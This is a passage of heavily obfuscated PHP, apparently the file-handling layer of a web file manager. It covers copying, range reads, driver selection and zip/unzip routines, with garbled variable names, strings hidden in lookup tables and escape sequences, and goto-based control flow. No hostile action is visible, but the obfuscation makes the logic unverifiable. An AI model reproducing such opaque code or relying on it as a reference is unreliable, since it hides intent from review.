$îèèÊ†œ->iconvApp($ö²æ£Ò); if (substr($ö²æ£Ò, strlen($ö¥İÌÑ)) == $ö¥İÌÑ) { $ÁÛ¯ÑªÀ = !0; } $¯ÏûÏÕÀ = $±Ì˜»ò©->upload($ƒ†ÖËàí, $ö²æ£Ò, $ÁÛ¯ÑªÀ); self::remove($©¶Ğ‹Í™); Hook::trigger($’Î¥¹ë[1158], $îèèÊ†œ, $€ŸêÌöó, $±Ì˜»ò©, $ƒ†ÖËàí, $à£ú†ÁÆ, $¯ÏûÏÕÀ); self::copyMoveKeepInfo($îèèÊ†œ, $€ŸêÌöó, $¯ÏûÏÕÀ); return $¯ÏûÏÕÀ; } private static function copyMoveKeepInfo($à®¦Â Ê, $§×¦¡Í, $‚ÒÊŸé) { if (!$‚ÒÊŸé) { return; } $Øåàì¥£ = $à®¦Â Ê->info($§×¦¡Í); if (!is_array($Øåàì¥£)) { return; } IO::setModifyTime($‚ÒÊŸé, $Øåàì¥£[$_SERVER[„Ç©ñÎ©][95]]); } public static function pathFather($‘Ü™ô”¡) { $êÖì§çª = IO::init($‘Ü™ô”¡); $ƒå€­Òö = $êÖì§çª->pathFather($êÖì§çª->path); return $êÖì§çª->getPathOuter($ƒå€­Òö); } public static function fileOut($¸üÙÒ¨», $±õ¡Ã = false, $„‡¸ë£¹ = false, $‚ÊÂ€ëµ = '') { $°›áÃ· = self::driverMake($¸üÙÒ¨»); if ($°›áÃ·->isFileOutServer()) { return $°›áÃ·->fileOutServer($¸üÙÒ¨», $±õ¡Ã, $„‡¸ë£¹, $‚ÊÂ€ëµ); } return $°›áÃ·->fileOut($¸üÙÒ¨», $±õ¡Ã, $„‡¸ë£¹, $‚ÊÂ€ëµ); } public static function fileOutImage($½¥ªâ”³, $Ãâõ½— = 250) { $ü’äùÛÔ = array(250, 600, 1200, 2000, 3000, 5000); for ($Èğô†šŸ = 0; $Èğô†šŸ < count($ü’äùÛÔ); $Èğô†šŸ++) { if ($Èğô†šŸ == 0 && $Ãâõ½— <= $ü’äùÛÔ[$Èğô†šŸ]) { $Ãâõ½— = $ü’äùÛÔ[$Èğô†šŸ]; break; } else { if ($Ãâõ½— > $ü’äùÛÔ[$Èğô†šŸ - 1] && $Ãâõ½— <= $ü’äùÛÔ[$Èğô†šŸ]) { $Ãâõ½— = $ü’äùÛÔ[$Èğô†šŸ]; break; } else { if ($Èğô†šŸ == count($ü’äùÛÔ) - 1 && $Ãâõ½— > $ü’äùÛÔ[$Èğô†šŸ]) { $Ãâõ½— = $ü’äùÛÔ[$Èğô†šŸ]; break; } } } } $ó¦ø”à¾ = self::driverMake($½¥ªâ”³); if ($ó¦ø”à¾->isFileOutServer()) { return $ó¦ø”à¾->fileOutImageServer($½¥ªâ”³, $Ãâõ½—); } return $ó¦ø”à¾->fileOutImage($½¥ªâ”³, $Ãâõ½—); } private static function driverIsSame($œù¨ÃĞ, $•»ÓòÂó) { $¨†’ºùô =& $_SERVER[„Ç©ñÎ©]; $ù‰•ŞÊ = $œù¨ÃĞ->getType(); $ÇÍß·Ô = $•»ÓòÂó->getType(); if ($ù‰•ŞÊ != $ÇÍß·Ô) { return !1; } if ($ù‰•ŞÊ == $¨†’ºùô[761]) { return !0; } if ($ù‰•ŞÊ == $¨†’ºùô[116]) { return !0; } if ($œù¨ÃĞ->pathDriver == $•»ÓòÂó->pathDriver) { return !0; } return !1; } public static function copyUpdate($çÁ‰©Ô, $Ñ´´ª¶) { $ˆ¸úºœª =& $_SERVER[„Ç©ñÎ©]; if (!IO::exist($çÁ‰©Ô)) { return !1; } if (!IO::exist($Ñ´´ª¶)) { IO::mkdir($Ñ´´ª¶); } $™µšòıÉ = self::_listAll($çÁ‰©Ô); $µœŞŞ€ = self::_listAll($Ñ´´ª¶); $Ü’²Û– = array(); $íëÅÔ¤° = array(); foreach ($™µšòıÉ as $ùƒä°æ => $‰Î±Ü¸â) { if (isset($µœŞŞ€[$ùƒä°æ])) { if ($‰Î±Ü¸â[$ˆ¸úºœª[85]] == 1) { continue; } if ($µœŞŞ€[$ùƒä°æ][$ˆ¸úºœª[86]] == $‰Î±Ü¸â[$ˆ¸úºœª[86]]) { continue; } } if ($‰Î±Ü¸â[$ˆ¸úºœª[85]] == 1) { $íëÅÔ¤°[] = $Ñ´´ª¶ . $ˆ¸úºœª[8] . $ùƒä°æ; continue; } $ØúòëãÁ = strstr(trim($ùƒä°æ, $ˆ¸úºœª[8]), $ˆ¸úºœª[8]) ? get_path_father($ùƒä°æ) : $ˆ¸úºœª[12]; $Ü’²Û–[] = array($ˆ¸úºœª[1159] => $‰Î±Ü¸â[$ˆ¸úºœª[94]], $ˆ¸úºœª[1160] => rtrim($Ñ´´ª¶, $ˆ¸úºœª[8]) . $ˆ¸úºœª[8] . $ØúòëãÁ, $ˆ¸úºœª[1161] => $‰Î±Ü¸â); } $­±¼öÊ• = array($ˆ¸úºœª[209] => $Ü’²Û–, $ˆ¸úºœª[85] => $íëÅÔ¤°); Hook::trigger($ˆ¸úºœª[1162], $çÁ‰©Ô, $Ñ´´ª¶, $­±¼öÊ•); foreach ($íëÅÔ¤° as $‰Î±Ü¸â) { IO::mkdir($‰Î±Ü¸â); } foreach ($Ü’²Û– as $‰Î±Ü¸â) { IO::copy($‰Î±Ü¸â[$ˆ¸úºœª[1159]], $‰Î±Ü¸â[$ˆ¸úºœª[1160]], REPEAT_REPLACE); } } private static function _listAll($÷Å¿Çß§) { $­Œ²„Îô =& $_SERVER[„Ç©ñÎ©]; $÷Å¿Çß§ = KodIO::clear($÷Å¿Çß§); $˜³¬ÜÀß = IO::listAll($÷Å¿Çß§); foreach ($˜³¬ÜÀß as &$äŸî©™») { $æáÜ¹ï = substr($äŸî©™»[$­Œ²„Îô[94]], strlen($÷Å¿Çß§)); $äŸî©™»[$­Œ²„Îô[1163]] = trim($æáÜ¹ï, $­Œ²„Îô[8]); } unset($äŸî©™»); return array_to_keyvalue($˜³¬ÜÀß, $­Œ²„Îô[1163]); } public static function fileSubstr($Óò”Œ¡, $¢Ê•¢åğ, $Å®úÕùª = false) { $½¿†ª³ =& $_SERVER[„Ç©ñÎ©]; $÷Ÿå¢£™ = self::driverMake($Óò”Œ¡); $†Õœı…– = $÷Ÿå¢£™->size($Óò”Œ¡); $¸â¥Ë·Î = $¢Ê•¢åğ; $ëû˜÷¦¾ = $Å®úÕùª; if ($¢Ê•¢åğ < 0) { $¢Ê•¢åğ = $†Õœı…– + $¢Ê•¢åğ; } if ($Å®úÕùª === !1) { $Å®úÕùª = $†Õœı…– - $¢Ê•¢åğ; } if ($¢Ê•¢åğ + $Å®úÕùª > $†Õœı…–) { $Å®úÕùª = $†Õœı…– - $¢Ê•¢åğ; } if (!$†Õœı…– && $÷Ÿå¢£™->getType() == $½¿†ª³[116] && !$÷Ÿå¢£™->exist($Óò”Œ¡)) { $ÅşÃ†® = get_path_this($Óò”Œ¡); $Ê›å –ã = parse_url_query($ÅşÃ†®); if (is_array($Ê›å –ã) && isset($Ê›å –ã[$½¿†ª³[32]])) { $ÅşÃ†® = urldecode($Ê›å –ã[$½¿†ª³[32]]); } throw new Exception($½¿†ª³[1164] . LNG($½¿†ª³[1165]) . $½¿†ª³[965] . clear_html($ÅşÃ†®) . $½¿†ª³[12]); } if ($Å®úÕùª <= 0) { return $½¿†ª³[12]; } if ($¢Ê•¢åğ < 0 || $¢Ê•¢åğ >= $†Õœı…– || $Å®úÕùª > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\145\x52\x65\141\x64\x20\145\x72\x72\x6f\x72\x21\x20\163\164\x61\x72\164\x3d{$¢Ê•¢åğ}\73\154\145\x6e\x67\x74\x68\75{$Å®úÕùª}\x3b\40\x73\x69\x7a\145\x3d{$†Õœı…–}\73"); } $Ş«öæÂÆ = $÷Ÿå¢£™->fileSubstr($Óò”Œ¡, $¢Ê•¢åğ, $Å®úÕùª); if (!$Ş«öæÂÆ && $Å®úÕùª && isset($GLOBALS[$½¿†ª³[1166]])) { throw new Exception($GLOBALS[$½¿†ª³[1166]][$½¿†ª³[1167]]); } return $Ş«öæÂÆ; } private static function driverMake(&$ıº¬¢‚†) { $¸Äá·›â =& $_SERVER[„Ç©ñÎ©]; $“‘©À = KodIO::parse($ıº¬¢‚†); if (!self::$driverListSystem) { $ÒÂŒ§êÁ = Model($¸Äá·›â[770])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ÒÂŒ§êÁ, $¸Äá·›â[408]); } if ($“‘©À[$¸Äá·›â[33]] == KodIO::KOD_IO && !self::$driverListSystem[$“‘©À[$¸Äá·›â[408]]]) { return !1; } $ıº¬¢‚† = $“‘©À[$¸Äá·›â[1168]]; $¿ÌŠ‰¤Ş = self::driverGet($“‘©À, $ıº¬¢‚†); return $¿ÌŠ‰¤Ş; } private static function driverGet($É¼ñÔĞ, &$¬á˜²Öà) { $¼“¦ ° =& $_SERVER[„Ç©ñÎ©]; $Å•³‚Êò = $É¼ñÔĞ[$¼“¦ °[1169]]; $ÃÌ‰ÛÏù = $É¼ñÔĞ[$¼“¦ °[408]]; switch ($É¼ñÔĞ[$¼“¦ °[33]]) { case KodIO::KOD_IO: $›ŞêÙ = self::$driverListSystem[$ÃÌ‰ÛÏù]; break; case KodIO::KOD_SOURCE: $¬á˜²Öà = $ÃÌ‰ÛÏù . $¬á˜²Öà; $›ŞêÙ = array($¼“¦ °[1170] => $¼“¦ °[1171], $¼“¦ °[6] => $É¼ñÔĞ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¬Š½È¤ = $GLOBALS[$¼“¦ °[1172]]; self::$driverListUser = array_to_keyvalue($¬Š½È¤, $¼“¦ °[408]); } $›ŞêÙ = self::$driverListUser[$ÃÌ‰ÛÏù]; break; case KodIO::KOD_SHARE_LINK: $›ŞêÙ = array($¼“¦ °[1170] => $¼“¦ °[1173], $¼“¦ °[6] => $É¼ñÔĞ); $®áÁ¸¬Æ = Action($¼“¦ °[1174])->sharePathInfo($É¼ñÔĞ[$¼“¦ °[94]]); $¬á˜²Öà = $®áÁ¸¬Æ[$¼“¦ °[411]]; if (!$®áÁ¸¬Æ[$¼“¦ °[411]]) { $—ú½Ó±œ = Model($¼“¦ °[610])->getInfo($®áÁ¸¬Æ[$¼“¦ °[498]]); $¬á˜²Öà = KodIO::clear($—ú½Ó±œ[$¼“¦ °[1175]] . $É¼ñÔĞ[$¼“¦ °[1168]]); $É¼ñÔĞ[$¼“¦ °[496]] = $—ú½Ó±œ; $É¼ñÔĞ[$¼“¦ °[1150]] = $¬á˜²Öà; $›ŞêÙ = array($¼“¦ °[1170] => $¼“¦ °[1176], $¼“¦ °[6] => $É¼ñÔĞ); } break; case KodIO::KOD_SHARE_ITEM: $›ŞêÙ = array($¼“¦ °[1170] => $¼“¦ °[1177], $¼“¦ °[6] => $É¼ñÔĞ); $—ú½Ó±œ = Model($¼“¦ °[610])->getInfo($É¼ñÔĞ[$¼“¦ °[408]]); if ($—ú½Ó±œ[$¼“¦ °[411]] == $¼“¦ °[207]) { $¬á˜²Öà = KodIO::clear($—ú½Ó±œ[$¼“¦ °[1175]] . $É¼ñÔĞ[$¼“¦ °[1168]]); $É¼ñÔĞ[$¼“¦ °[496]] = $—ú½Ó±œ; $É¼ñÔĞ[$¼“¦ °[1150]] = $¬á˜²Öà; $›ŞêÙ = array($¼“¦ °[1170] => $¼“¦ °[1178], $¼“¦ °[6] => $É¼ñÔĞ); } else { if (!$¬á˜²Öà) { $¬á˜²Öà = $—ú½Ó±œ[$¼“¦ °[411]]; } } break; default: $¬á˜²Öà = $É¼ñÔĞ[$¼“¦ °[94]]; $›ŞêÙ = array($¼“¦ °[1170] => $¼“¦ °[1179]); break; } $ÕÜ÷š¡Û = $É¼ñÔĞ[$¼“¦ °[94]]; if (!isset(self::$driverCache[$ÕÜ÷š¡Û])) { $°È†±£Æ = strtolower($›ŞêÙ[$¼“¦ °[105]]); $£´”ÏŞ» = $GLOBALS[$¼“¦ °[6]][$¼“¦ °[99]][$¼“¦ °[829]]; $­Åéó›× = $¼“¦ °[84] . (isset($£´”ÏŞ»[$°È†±£Æ]) ? $£´”ÏŞ»[$°È†±£Æ] : ucfirst($°È†±£Æ)); if (!class_exists($­Åéó›×)) { show_json("{$­Åéó›×}\40\156\157\x74\40\x65\x78\x69\163\164\x73\41", !1); } $ØÉÑì·¹ = isset($›ŞêÙ[$¼“¦ °[6]]) ? $›ŞêÙ[$¼“¦ °[6]] : !1; self::$driverCache[$ÕÜ÷š¡Û] = new $­Åéó›×($ØÉÑì·¹); } $²Èô›³¦ = self::$driverCache[$ÕÜ÷š¡Û]; $²Èô›³¦->pathDriver = $Å•³‚Êò; $²Èô›³¦->pathBase = $¼“¦ °[12]; if (isset($›ŞêÙ[$¼“¦ °[6]][$¼“¦ °[1180]])) { $²Èô›³¦->pathBase = rtrim($›ŞêÙ[$¼“¦ °[6]][$¼“¦ °[1180]], $¼“¦ °[8]) . $¼“¦ °[8]; $¬á˜²Öà = $²Èô›³¦->pathBase . ltrim($¬á˜²Öà, $¼“¦ °[8]); } $¬á˜²Öà = $²Èô›³¦->getPath($¬á˜²Öà); if (isset($É¼ñÔĞ[$¼“¦ °[1150]])) { $¬á˜²Öà = $É¼ñÔĞ[$¼“¦ °[1150]]; } $²Èô›³¦->path = $¬á˜²Öà; return $²Èô›³¦; } public static function errorTips($øíèªåÓ = false) { $™¼³Šºº =& $_SERVER[„Ç©ñÎ©]; static $¢†—ùÀÙ = array(); $¸‚Ş•Îµ = 1000; if ($øíèªåÓ === -1) { return $¢†—ùÀÙ ? $¢†—ùÀÙ[count($¢†—ùÀÙ) - 1] : $™¼³Šºº[12]; } if ($øíèªåÓ === !1) { return implode($™¼³Šºº[66], $¢†—ùÀÙ); } if (count($¢†—ùÀÙ) >= $¸‚Ş•Îµ) { $¢†—ùÀÙ = array_slice($¢†—ùÀÙ, $¸‚Ş•Îµ * 0.5, $¸‚Ş•Îµ); } $¢†—ùÀÙ[] = $øíèªåÓ; write_log($™¼³Šºº[172] . ACTION . $™¼³Šºº[1181] . $øíèªåÓ, $™¼³Šºº[1182]); } public static function getLastError($Î©éöğ· = '') { $—ÍôéŒ = self::errorTips(-1); return $—ÍôéŒ ? $—ÍôéŒ : $Î©éöğ·; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $â–È´Ü¾; if (!$â–È´Ü¾) { $ûÄÚÁ˜ = IO::init($_SERVER[„Ç©ñÎ©][8]); } return $ûÄÚÁ˜; } private static function iconvSystem($³ÕÛ¸÷) { return self::local()->iconvSystem($³ÕÛ¸÷); } private static function iconvApp($ÌïÁÊ²¡) { return self::local()->iconvApp($ÌïÁÊ²¡); } public static function zip($¨å×è¨, $î„ÖàÕş = "\x7a\151\160", $±Ÿ¢ñşÏ = '', $Êä°¥§‚ = REPEAT_RENAME) { $î«òŸ¶ =& $_SERVER[„Ç©ñÎ©]; $³½”¾æ¢ = self::init($¨å×è¨[0][$î«òŸ¶[94]]); $Ä„üÊ¸Ô = self::info($¨å×è¨[0][$î«òŸ¶[94]]); $æ«‚‰³œ = !1; if (!$±Ÿ¢ñşÏ && $³½”¾æ¢->getType() == $î«òŸ¶[116]) { $®ì£İîÑ = self::zipFileList($¨å×è¨); } else { $æ«‚‰³œ = $±Ÿ¢ñşÏ ? $±Ÿ¢ñşÏ : TEMP_FILES . $î«òŸ¶[1183] . time() . rand_string(8) . $î«òŸ¶[8]; mk_dir($æ«‚‰³œ); $®ì£İîÑ = self::zipFileList($¨å×è¨, $æ«‚‰³œ); } $ÖÜ›Ñ = $Ä„üÊ¸Ô[$î«òŸ¶[32]]; if (count($®ì£İîÑ) > 1) { $“Óºú”¥ = IO::info(IO::pathFather($Ä„üÊ¸Ô[$î«òŸ¶[94]])); $ÖÜ›Ñ = $“Óºú”¥[$î«òŸ¶[32]]; } $Ò‰¾§‘å = $æ«‚‰³œ; if (!$Ò‰¾§‘å) { $Ò‰¾§‘å = get_path_father($Ä„üÊ¸Ô[$î«òŸ¶[94]]); if (!$±Ÿ¢ñşÏ && $³½”¾æ¢->getType() == $î«òŸ¶[116]) { $Ò‰¾§‘å = get_path_father($³½”¾æ¢->path); } $şã·ŞóÂ = IO::info($Ò‰¾§‘å); if (!$şã·ŞóÂ[$î«òŸ¶[212]]) { show_json(LNG($î«òŸ¶[1184]), !1); } } $Ñ¥×½Îı = $Ò‰¾§‘å . $ÖÜ›Ñ . $î«òŸ¶[10] . $î„ÖàÕş; $Ñ¥×½Îı = get_filename_auto($Ñ¥×½Îı, $î«òŸ¶[12], $Êä°¥§‚); $ïë“»ƒ§ = self::iconvSystem($Ñ¥×½Îı); foreach ($®ì£İîÑ as $ìõÓğŞ => $Ã—”ç) { $®ì£İîÑ[$ìõÓğŞ] = self::iconvSystem($Ã—”ç); } KodArchive::create($ïë“»ƒ§, $®ì£İîÑ); if (!IO::exist($Ñ¥×½Îı)) { if ($æ«‚‰³œ) { del_dir($æ«‚‰³œ); } show_json(LNG($î«òŸ¶[1185]), !1); } if ($±Ÿ¢ñşÏ || !$æ«‚‰³œ) { if ($æ«‚‰³œ && strstr($æ«‚‰³œ, TEMP_FILES)) { $ç¨·òœ‹ = $®ì£İîÑ = array(); recursion_dir($Ò‰¾§‘å, $ç¨·òœ‹, $®ì£İîÑ, 0); foreach ($ç¨·òœ‹ as $å¤¸ïğå) { del_dir($å¤¸ïğå); } foreach ($®ì£İîÑ as $ÌÊæıï) { if ($ÌÊæıï == $ïë“»ƒ§) { continue; } del_file($ÌÊæıï); } } return $Ñ¥×½Îı; } $ôäÍ–¼˜ = self::pathFather($Ä„üÊ¸Ô[$î«òŸ¶[94]]); $ıê”³ = self::move($Ñ¥×½Îı, $ôäÍ–¼˜, $Êä°¥§‚); if (!$ıê”³) { del_dir($æ«‚‰³œ); show_json(LNG($î«òŸ¶[1185]), !1); } del_dir($æ«‚‰³œ); return $ıê”³; } public static function unzip($¶±ƒ´Ÿ, $¦Ğ¨Óâ— = "\x72\x65\x70\154\x61\x63\x65") { $œ…ÔßÄæ =& $_SERVER[„Ç©ñÎ©]; $Š‘ÛÎ·» = $¶±ƒ´Ÿ[$œ…ÔßÄæ[94]]; $–Ì³ıÊ = $¶±ƒ´Ÿ[$œ…ÔßÄæ[1186]]; if (!($­ˆù¯«‹ = parent::info($Š‘ÛÎ·»))) { show_json(LNG($œ…ÔßÄæ[1187]), !1); } if (!($ä öà±Á = parent::infoFull($–Ì³ıÊ))) { $–Ì³ıÊ = parent::mkdir($–Ì³ıÊ); $ä öà±Á = array($œ…ÔßÄæ[94] => $–Ì³ıÊ); } else { if (isset($ä öà±Á[$œ…ÔßÄæ[411]]) && trim($ä öà±Á[$œ…ÔßÄæ[94]], $œ…ÔßÄæ[8]) != trim($–Ì³ıÊ, $œ…ÔßÄæ[8])) { $âòæç™ = KodIO::make($ä öà±Á[$œ…ÔßÄæ[441]]); $“’Öâüù = parent::fileNameAuto($âòæç™, $ä öà±Á[$œ…ÔßÄæ[32]], REPEAT_RENAME_FOLDER, !0); $–Ì³ıÊ = parent::mkdir($âòæç™ . $“’Öâüù); $ä öà±Á = array($œ…ÔßÄæ[94] => $–Ì³ıÊ); } } $–Ì³ıÊ = $ä öà±Á[$œ…ÔßÄæ[94]]; $ƒ¦Òùù‹ = self::tmpFileName($­ˆù¯«‹); $«À¶Öğ = TEMP_FILES . $ƒ¦Òùù‹; del_dir($«À¶Öğ); mk_dir($«À¶Öğ); $îİšèƒ‰ = self::fileExt($­ˆù¯«‹); $ÙÀŞûŠé = $«À¶Öğ . $œ…ÔßÄæ[10] . $îİšèƒ‰; if (!@file_exists(self::iconvSystem($ÙÀŞûŠé))) { $—¯œ«Ï = self::localFilePath($Š‘ÛÎ·», $îİšèƒ‰); $ÙÀŞûŠé = $—¯œ«Ï ? $—¯œ«Ï : parent::download($Š‘ÛÎ·», $ÙÀŞûŠé); } $ÙÀŞûŠé = self::iconvSystem($ÙÀŞûŠé); $®½•×¥ó = isset($¶±ƒ´Ÿ[$œ…ÔßÄæ[1188]]) ? $¶±ƒ´Ÿ[$œ…ÔßÄæ[1188]] : $œ…ÔßÄæ[1189]; $¥¤ªîÆ = KodArchive::extract($ÙÀŞûŠé, $«À¶Öğ . $œ…ÔßÄæ[8], $®½•×¥ó); self::archiveExt(); if (!$¥¤ªîÆ[$œ…ÔßÄæ[1190]]) { show_json($œ…ÔßÄæ[1191] . $¥¤ªîÆ[$œ…ÔßÄæ[1192]], !1); } Hook::trigger($œ…ÔßÄæ[1193], $«À¶Öğ); recursion_dir($«À¶Öğ, $üÈí¿®ª, $ Æ¤¼‚, 0); $â¸Ì…ç¢ = array_merge($üÈí¿®ª, $ Æ¤¼‚); foreach ($â¸Ì…ç¢ as $È“©˜˜Á) { $È“©˜˜Á = self::iconvApp($È“©˜˜Á); self::move($È“©˜˜Á, $–Ì³ıÊ, $¦Ğ¨Óâ—); } del_dir($«À¶Öğ); if (!$—¯œ«Ï) { del_file($ÙÀŞûŠé); } return !0; } public static function unzipList($ñÌĞØ¡“) { $ÇÉùƒòä =& $_SERVER[„Ç©ñÎ©]; $®‹±ƒú‘ = $ñÌĞØ¡“[$ÇÉùƒòä[94]]; $‹ûÀ°ßæ = isset($ñÌĞØ¡“[$ÇÉùƒòä[1194]]) ? $ñÌĞØ¡“[$ÇÉùƒòä[1194]] : -1; $Èşå÷º = 50000; if (request_url_safe($®‹±ƒú‘)) { $‘±êÆßÏ = parse_url_query($®‹±ƒú‘); if (!isset($‘±êÆßÏ[$ÇÉùƒòä[94]])) { show_json($ÇÉùƒòä[1195], !1); } } $Š™‹ô²õ = isset($‘±êÆßÏ) ? $‘±êÆßÏ[$ÇÉùƒòä[94]] : $®‹±ƒú‘; $ºÑ³”Ê© = self::info($Š™‹ô²õ); $ò…ıÀ©‚ = self::fileExt($ºÑ³”Ê©); $——­‚™– = self::tmpFileName($ºÑ³”Ê©); if (isset($‘±êÆßÏ)) { $ü´…÷Õ = array($‘±êÆßÏ[$ÇÉùƒòä[94]], $‘±êÆßÏ[$ÇÉùƒòä[1194]], $‘±êÆßÏ[$ÇÉùƒòä[32]]); $¡‰¡Û‘Ë = md5(implode($ÇÉùƒòä[11], $ü´…÷Õ)) . $ÇÉùƒòä[10] . get_path_ext($‘±êÆßÏ[$ÇÉùƒòä[32]]); } else { $ü´…÷Õ = array($ºÑ³”Ê©[$ÇÉùƒòä[32]], $ºÑ³”Ê©[$ÇÉùƒòä[94]], $ºÑ³”Ê©[$ÇÉùƒòä[86]]); $¡‰¡Û‘Ë = md5(implode($ÇÉùƒòä[11], $ü´…÷Õ)) . $ÇÉùƒòä[10] . $ò…ıÀ©‚; } if ($‹ûÀ°ßæ == -1) { $ó¦®Ñ»Û = IO_PATH_SYSTEM_TEMP . "\172\151\x70\126\x69\x65\x77\57{$——­‚™–}\57{$¡‰¡Û‘Ë}\x2e\x6c\157\x67"; $ó¢õâ­– = self::infoFull($ó¦®Ñ»Û); if ($ó¢õâ­–) { $ó¦®Ñ»Û = $ó¢õâ­–[$ÇÉùƒòä[94]]; $´Ÿ¤—ùå = self::getContent($ó¦®Ñ»Û); if ($´Ÿ¤—ùå) { $ù‚°ßã‚ = json_decode($´Ÿ¤—ùå, !0); $ù‚°ßã‚ = is_array($ù‚°ßã‚) ? $ù‚°ßã‚ : array(); if (count($ù‚°ßã‚) >= $Èşå÷º) { show_json(sprintf(LNG($ÇÉùƒòä[1196]), count($ù‚°ßã‚)), !1); } return $ù‚°ßã‚; } } else { $ó¦®Ñ»Û = self::mkfile($ó¦®Ñ»Û); } } $ÉÒ··¾Ù = TEMP_FILES . $——­‚™–; if (!is_dir($ÉÒ··¾Ù)) { mk_dir($ÉÒ··¾Ù); } $óƒÛÈÜ… = $ÉÒ··¾Ù . $ÇÉùƒòä[8] . $¡‰¡Û‘Ë; if (!@file_exists(self::iconvSystem($óƒÛÈÜ…))) { if (isset($‘±êÆßÏ)) { url_request($®‹±ƒú‘, $ÇÉùƒòä[1197], $óƒÛÈÜ…); } else { $Ş¿«Ú¢ = self::localFilePath($®‹±ƒú‘, $ò…ıÀ©‚); $óƒÛÈÜ… = $Ş¿«Ú¢ ? $Ş¿«Ú¢ : self::download($®‹±ƒú‘, $óƒÛÈÜ…); } } $óƒÛÈÜ… = self::iconvSystem($óƒÛÈÜ…); if ($‹ûÀ°ßæ >= 0) { $¢ˆô€³ = isset($ñÌĞØ¡“[$ÇÉùƒòä[1198]]) ? $ñÌĞØ¡“[$ÇÉùƒòä[1198]] : !1; $È¥…ºÙ = isset($ñÌĞØ¡“[$ÇÉùƒòä[32]]) ? $ñÌĞØ¡“[$ÇÉùƒòä[32]] : $ÇÉùƒòä[12]; KodArchive::filePreview($óƒÛÈÜ…, $‹ûÀ°ßæ, $¢ˆô€³, $È¥…ºÙ); self::archiveExt(); die; } $Ş›şÑÉ« = KodArchive::listContent($óƒÛÈÜ…); self::archiveExt(); del_dir($ÉÒ··¾Ù); if (!$Ş›şÑÉ«[$ÇÉùƒòä[1190]]) { show_json($Ş›şÑÉ«[$ÇÉùƒòä[1192]], !1); } $ù‚°ßã‚ = json_encode($Ş›şÑÉ«[$ÇÉùƒòä[1192]]); self::setContent($ó¦®Ñ»Û, $ù‚°ßã‚); if (count($Ş›şÑÉ«[$ÇÉùƒòä[1192]]) >= $Èşå÷º) { show_json(sprintf(LNG($ÇÉùƒòä[1196]), count($Ş›şÑÉ«[$ÇÉùƒòä[1192]])), !1); } return $Ş›şÑÉ«[$ÇÉùƒòä[1192]]; } private static function fileExt($–„šÅİ‡) { $ÎŒ´İŠÅ =& $_SERVER[„Ç©ñÎ©]; $‹Õªï² = $–„šÅİ‡[$ÎŒ´İŠÅ[184]]; if ($‹Õªï² == $ÎŒ´İŠÅ[1199]) { $Ş·­™Ê = $ÎŒ´İŠÅ[1200]; if (substr($–„šÅİ‡[$ÎŒ´İŠÅ[32]], -strlen($Ş·­™Ê)) == $Ş·­™Ê) { $‹Õªï² = $ÎŒ´İŠÅ[1201]; } } self::archiveExt($‹Õªï²); return $‹Õªï²; } private static function zipFileList($îãÃÒ¿, $æÄ‚¬ä¬ = false) { $Û¿ğ›Å =& $_SERVER[„Ç©ñÎ©]; $½¾æíÌ = array(); foreach ($îãÃÒ¿ as $ÅøŞˆ) { $ì°àÈ = $ÅøŞˆ[$Û¿ğ›Å[94]]; if ($æÄ‚¬ä¬) { $ì°àÈ = self::copy($ÅøŞˆ[$Û¿ğ›Å[94]], $æÄ‚¬ä¬, $Û¿ğ›Å[821]); } else { $¢í·¡Ñ  = self::init($ÅøŞˆ[$Û¿ğ›Å[94]]); if ($¢í·¡Ñ ->getType() == $Û¿ğ›Å[116]) { $ì°àÈ = $¢í·¡Ñ ->path; } } if ($ì°àÈ && self::local()->exist($ì°àÈ)) { $½¾æíÌ[$ÅøŞˆ[$Û¿ğ›Å[94]]] = $ì°àÈ; } } if (!empty($½¾æíÌ)) { return array_values($½¾æíÌ); } show_json(LNG($Û¿ğ›Å[1165]), !1); } public static function tmpFileName($¦­ÌŸ°Ø) { $ÅøƒÓë =& $_SERVER[„Ç©ñÎ©]; $ÅŒÃÙ¯Î = array($¦­ÌŸ°Ø[$ÅøƒÓë[32]], $¦­ÌŸ°Ø[$ÅøƒÓë[94]], $¦­ÌŸ°Ø[$ÅøƒÓë[86]], $¦­ÌŸ°Ø[$ÅøƒÓë[530]]); return md5(implode($ÅøƒÓë[11], $ÅŒÃÙ¯Î)); } private static function localFilePath($¶şêÄ¨İ, $Ù§åªã) { $‚òèÚ“Ç =& $_SERVER[„Ç©ñÎ©]; if ($Ù§åªã == $‚òèÚ“Ç[1202] && strtoupper(substr(PHP_OS, 0, 3)) == $‚òèÚ“Ç[1203]) { return !1; } $Ï¶ÈØ–¶ = KodIO::parse($¶şêÄ¨İ); if ($Ï¶ÈØ–¶[$‚òèÚ“Ç[33]] == KodIO::KOD_SOURCE) { $…Øş¯Ø¯ = Model($‚òèÚ“Ç[828])->fileInfoGet(KodIO::sourceID($¶şêÄ¨İ)); if (!$…Øş¯Ø¯[$‚òèÚ“Ç[94]]) { show_json($‚òèÚ“Ç[1204], !1); } $¶şêÄ¨İ = $…Øş¯Ø¯[$‚òèÚ“Ç[94]]; } $¾™³›íú = self::init($¶şêÄ¨İ); if ($¾™³›íú->pathParse[$‚òèÚ“Ç[1150]]) { $¶şêÄ¨İ = $¾™³›íú->pathParse[$‚òèÚ“Ç[1150]]; $¾™³›íú = self::init($¶şêÄ¨İ); } $õòóâ ™ = $¾™³›íú->getType(); if ($õòóâ ™ == $‚òèÚ“Ç[116] || $õòóâ ™ == $‚òèÚ“Ç[1205]) { if (!$¾™³›íú->exist($¾™³›íú->path)) { show_json(LNG($‚òèÚ“Ç[115]), !1); } return $¾™³›íú->path; } return !1; } private static function archiveExt($‡¥Í§¹› = '') { $GLOBALS[$_SERVER[„Ç©ñÎ©][1206]] = $‡¥Í§¹›; } } goto F¡›‹ŠÏ¤†; aîê°±Ü: define($_SERVER[„Ç©ñÎ©][247], 1); define($_SERVER[„Ç©ñÎ©][248], 2); define($_SERVER[„Ç©ñÎ©][249], 3); goto Cİ™¢òøéÙ; C˜Ã‚¸ğ: class PathDriverDriverShareItem { public function __construct($„ÒƒİäÕ) { $this->pathParse = $„ÒƒİäÕ; } public function __call($ï®û¶¹, $áãë´½ñ) { $³É¢·“‹ =& $_SERVER[„Ç©ñÎ©]; if (method_exists($this, $ï®û¶¹)) { return; } $Î‹‘·Åö = call_user_func_array(array($³É¢·“‹[1336], $ï®û¶¹), $áãë´½ñ); $úóÄ›ˆ» = array($³É¢·“‹[1337], $³É¢·“‹[1338], $³É¢·“‹[1339], 